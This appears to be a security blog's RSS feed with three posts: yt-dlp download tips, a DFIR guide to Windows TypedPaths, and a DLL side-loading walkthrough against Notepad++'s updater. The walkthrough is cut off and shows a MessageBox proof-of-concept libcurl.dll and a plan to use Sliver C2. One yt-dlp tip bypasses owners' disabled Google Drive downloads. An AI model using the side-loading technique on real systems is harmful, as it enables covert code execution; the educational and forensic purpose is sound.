<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="rss.xsl"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>solivaquaant Blog</title>
        <link>https://solivaquaant.github.io/my-small-blog/blog</link>
        <description>solivaquaant Blog</description>
        <lastBuildDate>Tue, 14 Oct 2025 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[A few handy tips for downloading videos with yt-dlp]]></title>
            <link>https://solivaquaant.github.io/my-small-blog/blog/yt-dlp</link>
            <guid>https://solivaquaant.github.io/my-small-blog/blog/yt-dlp</guid>
            <pubDate>Tue, 14 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[A blog about yt-dlp]]></description>
            <content:encoded><![CDATA[<p>If you often need to save videos from YouTube, Facebook, or TikTok - without watermarks - or even grab files from Google Drive that the owner has disabled downloads for, <strong>yt-dlp</strong> is a powerful tool worth knowing.
In this post, I'll walk you through how to set it up and use it effectively on Windows.</p>
<p>(If you're on Linux or macOS, the steps are similar - just check your platform's installation guide.)</p>
<!-- -->
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="setting-up">Setting up<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#setting-up" class="hash-link" aria-label="Direct link to Setting up" title="Direct link to Setting up" translate="no">​</a></h2>
<p>Before you can use <code>yt-dlp</code>, you'll need 2 key components installed on your system: <strong>FFmpeg</strong> and <strong>Python 3</strong>.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-ffmpeg">Installing FFmpeg<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#installing-ffmpeg" class="hash-link" aria-label="Direct link to Installing FFmpeg" title="Direct link to Installing FFmpeg" translate="no">​</a></h3>
<p>Start by downloading the full build of FFmpeg from <a href="https://www.gyan.dev/ffmpeg/builds/" target="_blank" rel="noopener noreferrer" class="">this</a>.
Once downloaded, right-click the archive and choose <strong>Extract Files</strong>, then rename the extracted folder to <code>FFmpeg</code>.
Move this folder to your <code>C:\</code> drive so that your path becomes <code>C:\FFmpeg</code>.</p>
<p>Next, open <strong>Command Prompt</strong> as <em>Administrator</em> and run:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setx /m PATH "C:\ffmpeg\bin;%PATH%"</span><br></span></code></pre></div></div>
<p>This adds FFmpeg to your system's environment variables.</p>
<p>To confirm everything's working, close the current Command Prompt, open a new one, and type:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ffmpeg --h</span><br></span></code></pre></div></div>
<p>If the command runs successfully, you're good to go.
If you get an error like <em>'ffmpeg' is not recognized as an internal or external command</em>, double-check your folder name and path.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-python-3">Installing Python 3<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#installing-python-3" class="hash-link" aria-label="Direct link to Installing Python 3" title="Direct link to Installing Python 3" translate="no">​</a></h3>
<p>Since yt-dlp is written in Python, you'll need it installed.
Grab the latest version from <a href="https://www.python.org/downloads/" target="_blank" rel="noopener noreferrer" class="">Python</a> and install it as usual.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="creating-a-virtual-environment">Creating a virtual environment<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#creating-a-virtual-environment" class="hash-link" aria-label="Direct link to Creating a virtual environment" title="Direct link to Creating a virtual environment" translate="no">​</a></h3>
<p>To avoid version conflicts with other Python projects, it's best to create a virtual environment.</p>
<ol>
<li class="">Open the folder where you want to save your downloaded videos.</li>
<li class="">Right-click inside it and choose <strong>Open in Terminal</strong>.</li>
<li class="">Run the following command:<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python -m venv venv</span><br></span></code></pre></div></div>
<!-- -->This creates a folder named <code>venv</code> - your isolated environment.</li>
<li class="">Activate it with:<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\venv\Scripts\activate</span><br></span></code></pre></div></div>
<!-- -->When you see <code>(venv)</code> at the start of your command line, it means the environment is active.</li>
</ol>
<p>Each time you want to use yt-dlp, remember to activate this environment first.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-yt-dlp">Installing yt-dlp<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#installing-yt-dlp" class="hash-link" aria-label="Direct link to Installing yt-dlp" title="Direct link to Installing yt-dlp" translate="no">​</a></h3>
<p>With your environment active, install yt-dlp by running:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip install yt-dlp</span><br></span></code></pre></div></div>
<p>That's it - you can now use yt-dlp to download videos right from the command line.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="downloading-videos-the-usual-way">Downloading videos the usual way<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#downloading-videos-the-usual-way" class="hash-link" aria-label="Direct link to Downloading videos the usual way" title="Direct link to Downloading videos the usual way" translate="no">​</a></h2>
<p>Downloading videos is straightforward once yt-dlp is set up.</p>
<ul>
<li class="">To download a video in its original format (could be MP4, WebM, MOV, etc.):<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yt-dlp "video-link"</span><br></span></code></pre></div></div>
</li>
<li class="">To force the output format to MP4:<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yt-dlp -t mp4 "video-link"</span><br></span></code></pre></div></div>
</li>
<li class="">To download only a specific section of a video (for example, from 11:11 to 22:22):<!-- -->
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yt-dlp -t mp4 --download-sections "*00:11:11-00:22:22" "video-link"</span><br></span></code></pre></div></div>
</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="downloading-videos-that-require-login-using-cookies">Downloading videos that require login (using cookies)<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#downloading-videos-that-require-login-using-cookies" class="hash-link" aria-label="Direct link to Downloading videos that require login (using cookies)" title="Direct link to Downloading videos that require login (using cookies)" translate="no">​</a></h2>
<p>Some videos - for example, private or restricted ones - require authentication.
yt-dlp supports downloading these by using your browser cookies.
First, install a cookie-export extension for your browser:</p>
<ul>
<li class=""><strong>Chrome / Edge:</strong> <a href="https://chromewebstore.google.com/detail/get-cookiestxt-locally/cclelndahbckbenkjhflpdbgdldlbecc" target="_blank" rel="noopener noreferrer" class="">Get cookies.txt LOCALLY</a></li>
<li class=""><strong>Firefox:</strong> <a href="https://addons.mozilla.org/en-US/firefox/addon/cookies-txt/" target="_blank" rel="noopener noreferrer" class="">cookies.txt</a></li>
<li class=""><strong>Opera:</strong> <a href="https://addons.opera.com/en/extensions/details/edit-this-cookie/" target="_blank" rel="noopener noreferrer" class="">EditThisCookie</a></li>
</ul>
<p>Open the video link in your browser, use the extension to export cookies, and save them as a file (for example, <code>cookies.txt</code>).</p>
<p>Then, in your terminal, run:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yt-dlp -f mp4 --cookies &lt;path-to-cookie-file&gt; "video-link"</span><br></span></code></pre></div></div>
<p>This method even lets you download videos from <strong>Google Drive</strong>, including those where the owner has disabled the download option - neat, right?</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="final-thoughts">Final thoughts<a href="https://solivaquaant.github.io/my-small-blog/blog/yt-dlp#final-thoughts" class="hash-link" aria-label="Direct link to Final thoughts" title="Direct link to Final thoughts" translate="no">​</a></h2>
<p>These are just a few simple but useful tricks when working with <strong>yt-dlp</strong> - a lightweight yet powerful open-source downloader.
It's perfect for saving videos for offline viewing, editing, or archiving.</p>
<p>If I discover more interesting use cases or shortcuts later, I'll update this post.
Thanks for reading, and happy downloading!</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[A deep dive into Windows TypedPaths]]></title>
            <link>https://solivaquaant.github.io/my-small-blog/blog/typed-paths</link>
            <guid>https://solivaquaant.github.io/my-small-blog/blog/typed-paths</guid>
            <pubDate>Tue, 30 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[A blog about Typed Paths registry in Windows.]]></description>
            <content:encoded><![CDATA[<p>What if the Windows Registry kept a memory of every path you typed into Explorer?
Typed Paths do exactly that-making them a goldmine for investigators tracking attacker movements.</p>
<!-- -->
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-are-typed-paths--why-do-they-matter-in-dfir">What are Typed Paths &amp; why do they matter in DFIR?<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#what-are-typed-paths--why-do-they-matter-in-dfir" class="hash-link" aria-label="Direct link to What are Typed Paths &amp; why do they matter in DFIR?" title="Direct link to What are Typed Paths &amp; why do they matter in DFIR?" translate="no">​</a></h2>
<p><strong>Typed Paths</strong> are a forensic artifact found deep within the Windows Registry.
Essentially, they record the paths (file, folder, or even commands) that a user has typed or pasted into the <strong>File Explorer</strong> (or Windows Explorer) address bar.
Their primary function is to power the convenient auto-complete feature for subsequent inputs.</p>
<p>Examples of what's recorded:</p>
<ul>
<li class=""><code>C:\Windows\System32</code></li>
<li class=""><code>\\192.168.1.100\share</code> (a network share)</li>
<li class=""><code>cmd</code></li>
<li class=""><code>powershell</code></li>
</ul>
<p>Think of it as the <strong>Most Recently Used</strong> (MRU) list for the Explorer's path bar.</p>
<p>While simple, this artifact provides a crucial window into user (or attacker) behavior, specifically what commands they executed or what resources they tried to access.
It can quickly expose the telltale signs of unusual activity:</p>
<ul>
<li class="">Running specific malware executables or scripts.</li>
<li class="">Accessing suspicious or external network shares (UNC paths).</li>
<li class="">Executing command-line tools like cmd, powershell, or mstsc directly from the path bar.</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="where-are-typed-paths-stored">Where are Typed Paths stored?<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#where-are-typed-paths-stored" class="hash-link" aria-label="Direct link to Where are Typed Paths stored?" title="Direct link to Where are Typed Paths stored?" translate="no">​</a></h2>
<p>Typed Paths are a <strong>per-user</strong> structure, meaning the data is located within that specific user's hive file (<code>NTUSER.DAT</code>).</p>
<p>The Registry Key Location:</p>
<ul>
<li class=""><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths</code></li>
</ul>
<p>In a mounted offline hive, you'd find it under: <code>HKEY_USERS\&lt;User-SID&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths</code></p>
<p>The sub-values are typically named <code>url1</code>, <code>url2</code>, <code>url3</code>, and so on, with a data type of <code>REG_SZ</code> (text string).
Crucially, the newest path is almost always found in <code>url1</code>.
When a new path is added, the older entries get "rolled down" to the next number.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-data-can-you-expect-to-find">What data can you expect to find?<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#what-data-can-you-expect-to-find" class="hash-link" aria-label="Direct link to What data can you expect to find?" title="Direct link to What data can you expect to find?" translate="no">​</a></h2>
<p>The paths stored in TypedPaths can take various forms, offering rich context:</p>
<ul>
<li class="">Folder Paths: <code>C:\Users\Alice\Documents</code></li>
<li class="">File/Executable Paths: <code>C:\Temp\installer.exe</code></li>
<li class="">UNC Network Paths: <code>\\10.10.10.5\share</code> or <code>\\attacker-server\payload</code></li>
<li class="">Simple Commands: <code>cmd</code>, <code>powershell</code>, <code>mstsc</code></li>
</ul>
<p>URLs or other strings if an application or user inputs them into the address bar.</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/registry-ex-1fa1df6433e085946353e60e051da2b3.png" style="width:100%;height:auto"></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-value-in-dfir--threat-hunting">The value in DFIR &amp; threat hunting<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#the-value-in-dfir--threat-hunting" class="hash-link" aria-label="Direct link to The value in DFIR &amp; threat hunting" title="Direct link to The value in DFIR &amp; threat hunting" translate="no">​</a></h2>
<p>Despite its simplicity, TypedPaths can reveal the exact strings or commands an account attempted to run or access.
This is incredibly valuable for:</p>
<ul>
<li class="">Spotting suspicious behavior: Identifying specific actions like connecting to an unfamiliar IP via UNC path, directly invoking a payload, or running an unusual binary.</li>
<li class="">Verifying the threat actor's path: Confirming if the attacker used the Run dialog box or Explorer's address bar to launch tools like <code>psexec</code> or <code>powershell</code>.</li>
<li class="">Detecting abnormal network access: Pinpointing attempts to access network resources that fall outside a user's normal scope of work.</li>
</ul>
<p>Since this is a per-user artifact, it's excellent for isolating and differentiating the actions taken by various accounts on a compromised machine.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-collect-typed-paths">How to collect Typed Paths<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#how-to-collect-typed-paths" class="hash-link" aria-label="Direct link to How to collect Typed Paths" title="Direct link to How to collect Typed Paths" translate="no">​</a></h2>
<p>You generally have 2 main contexts for collection:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="live--on-system-collection">Live / On-system collection<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#live--on-system-collection" class="hash-link" aria-label="Direct link to Live / On-system collection" title="Direct link to Live / On-system collection" translate="no">​</a></h3>
<p>This is useful for quick triage on a running system, but be mindful not to alter the registry state while analyzing.</p>
<ul>
<li class="">
<p><strong>PowerShell</strong>:</p>
<ul>
<li class="">Basic command (read urlN values):</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"</span><br></span></code></pre></div></div>
<ul>
<li class="">Export to CSV (separating urlN into Key/Value columns) for storage or ingestion into an analysis pipeline:</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Select-Object -Property * |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ForEach-Object {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $props = $_.psobject.properties | Where-Object { $_.Name -match '^url' }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        foreach ($p in $props) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            [PSCustomObject]@{ Key = $p.Name; Value = $p.Value }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } | Export-Csv -Path C:\test.csv -NoTypeInformation -Encoding UTF8</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>reg.exe</strong>: Export the key into a <code>.reg</code> file for backup/copy:</p>
</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" typedpaths.reg</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="offline--image-analysis">Offline / image analysis<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#offline--image-analysis" class="hash-link" aria-label="Direct link to Offline / image analysis" title="Direct link to Offline / image analysis" translate="no">​</a></h3>
<p>This is the safer, forensically sound method:</p>
<ul>
<li class="">Load the Hive: You extract the <code>NTUSER.DAT</code> file from the relevant user's profile on the disk image.</li>
<li class="">Analyze: Load this hive copy into a dedicated forensic tool (like Registry Explorer) for read-only analysis.</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="limitations">Limitations<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#limitations" class="hash-link" aria-label="Direct link to Limitations" title="Direct link to Limitations" translate="no">​</a></h2>
<p>Typed Paths are a great indicator, but they are not a "smoking gun" on their own:</p>
<ul>
<li class="">Commit Time: Entries are not always immediate. If the Explorer window hasn't been closed, the entry might not have been "committed" to the registry yet.</li>
<li class="">No Per-Entry Timestamp: This is the biggest drawback. TypedPaths does not store an individual timestamp for each urlN value.</li>
<li class="">The only timestamp available is the <strong>LastWriteTime</strong> of the parent TypedPaths key (the last time any entry was added or modified).</li>
<li class="">Evasion: A user (or threat actor) can manually clear these registry values.</li>
<li class="">Windows Versions: The behavior, size, and even the exact storage path can sometimes vary between Windows versions.</li>
</ul>
<p>You must correlate TypedPaths content with other artifacts-such as Prefetch, Shellbags, Event Logs, Amcache, UserAssist, or Sysmon-to accurately establish timelines and confidence levels.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="https://solivaquaant.github.io/my-small-blog/blog/typed-paths#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
<p>Typed Paths isn't a silver bullet, but it is an invaluable, intuitive, and fast source of intelligence-especially during initial triage or when other logging sources are incomplete.
When collected, validated, and correlated properly, Typed Paths can significantly shorten your investigation time and expose specific, high-value suspicious behaviors left behind by an attacker.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Exploring DLL Side Loading: A practical walkthrough using Notepad++]]></title>
            <link>https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp</link>
            <guid>https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp</guid>
            <pubDate>Sat, 03 May 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Blog]]></description>
            <content:encoded><![CDATA[<p>In today's blog post, we're diving into DLL Side Loading - a technique often exploited by attackers to execute malicious code by abusing the way Windows searches for and loads dynamic link libraries.
We'll break down how DLL Side Loading works, how the Windows DLL search order contributes to the vulnerability, and walk through a practical example using Notepad++ as our target application.</p>
<!-- -->
<blockquote>
<p>⚠️ Disclaimer<br>
<!-- -->This article is for <strong>educational</strong> and <strong>ethical</strong> purposes only.</p>
</blockquote>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-dlls-and-dll-side-loading">Understanding DLLs and DLL Side Loading<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#understanding-dlls-and-dll-side-loading" class="hash-link" aria-label="Direct link to Understanding DLLs and DLL Side Loading" title="Direct link to Understanding DLLs and DLL Side Loading" translate="no">​</a></h2>
<p><strong>Dynamic link libraries (DLLs)</strong> are modular components that contain code and data used by multiple programs simultaneously.
DLLs help reduce redundancy and optimize memory usage across Windows systems.</p>
<p><strong>DLL side loading</strong> is a technique where an attacker places a malicious DLL in a location where a legitimate application may inadvertently load it instead of the intended one.
This often happens due to the <strong>Windows DLL search order</strong>, which prioritizes certain directories (like the application's folder) over system directories when loading libraries.
By exploiting this search behavior, attackers can trick applications into executing their malicious payloads without modifying the target application itself.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools--setup">Tools &amp; setup<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#tools--setup" class="hash-link" aria-label="Direct link to Tools &amp; setup" title="Direct link to Tools &amp; setup" translate="no">​</a></h2>
<p>For this walkthrough, we'll be using the following tools and setup:</p>
<ul>
<li class="">Target: Notepad++ v8.7.7</li>
<li class="">ProcMon (Sysinternals): Monitor DLL loading and process activity</li>
<li class="">x64dbg: Reverse-engineering and binary analysis</li>
<li class="">Visual Studio: Compile our custom DLLs</li>
<li class="">Sliver C2: Open-source C2 framework</li>
</ul>
<p>Environment:</p>
<ul>
<li class="">Victim: Windows 10/11</li>
<li class="">Attacker: Kali Linux</li>
<li class="">Network: NAT (VMware)</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="case-study-gupexe-in-notepad">Case study: GUP.exe in Notepad++<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#case-study-gupexe-in-notepad" class="hash-link" aria-label="Direct link to Case study: GUP.exe in Notepad++" title="Direct link to Case study: GUP.exe in Notepad++" translate="no">​</a></h2>
<p>Notepad++ ships with an updater utility called <strong>GUP.exe (Generic Updater)</strong>.
It typically resides in <code>C:\Program Files\Notepad++\updater\GUP.exe</code>.
This executable checks for and installs updates for Notepad++ or its plugins.
When run, it prompts a software update popup and loads several files from its directory, including:</p>
<ul>
<li class=""><code>GUP.exe</code></li>
<li class=""><code>libcurl.dll</code> -a dynamic library from the cURL project for network communication</li>
<li class=""><code>gup.xml</code> - configuration file for update behavior</li>
</ul>
<p>By using <strong>ProcMon</strong>, we observe that <code>GUP.exe</code> loads <code>libcurl.dll</code> from the local directory, making it an <em>ideal</em> candidate for DLL Side Loading.</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/procmon-69ff9d3520c76e073e65fdf0649e1971.png" style="width:100%;height:auto"></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="crafting-the-first-malicious-dll">Crafting the first malicious DLL<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#crafting-the-first-malicious-dll" class="hash-link" aria-label="Direct link to Crafting the first malicious DLL" title="Direct link to Crafting the first malicious DLL" translate="no">​</a></h2>
<p>To test the loading behavior, we create a simple malicious <code>libcurl.dll</code> with a MessageBox payload:</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">BOOL APIENTRY </span><span class="token function" style="color:#d73a49">DllMain</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HMODULE hModule</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> DWORD  ul_reason_for_call</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> LPVOID lpReserved</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">switch</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ul_reason_for_call</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> DLL_PROCESS_ATTACH</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">MessageBoxA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Group-CK13"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Simple DLL"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MB_OK </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MB_ICONEXCLAMATION</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> TRUE</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Replace the original <code>libcurl.dll</code> with our malicious version and execute <code>GUP.exe</code>.
We notice 2 things in <strong>ProcMon</strong>:</p>
<ul>
<li class="">Our malicious DLL was successfully loaded</li>
<li class="">GUP.exe crashes due to missing exported functions like <code>curl_easy_setopt</code></li>
</ul>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/error-0650988fa04da984ad51f23913a333b7.png" style="width:100%;height:auto"></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="identifying-and-exporting-required-functions">Identifying and exporting required functions<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#identifying-and-exporting-required-functions" class="hash-link" aria-label="Direct link to Identifying and exporting required functions" title="Direct link to Identifying and exporting required functions" translate="no">​</a></h2>
<p>The crash occurs because <code>GUP.exe</code> expects <code>libcurl.dll</code> to expose certain functions, which our malicious DLL lacks.
To identify them, use <code>dumpbin /IMPORTS GUP.exe</code> in the Visual Studio command prompt to inspect the <strong>Import Address Table (IAT)</strong>:</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/dumpbin-ad88fb454be97c973fe163e92ba34747.png" style="width:100%;height:auto"></div>
<p>You'll find it imports these 4 functions: <code>curl_easy_init</code>, <code>curl_easy_setopt</code>, <code>curl_easy_cleanup</code>, <code>curl_easy_perform</code></p>
<p>We modify our DLL to export these functions, with <code>curl_easy_init</code> triggering our MessageBox:</p>
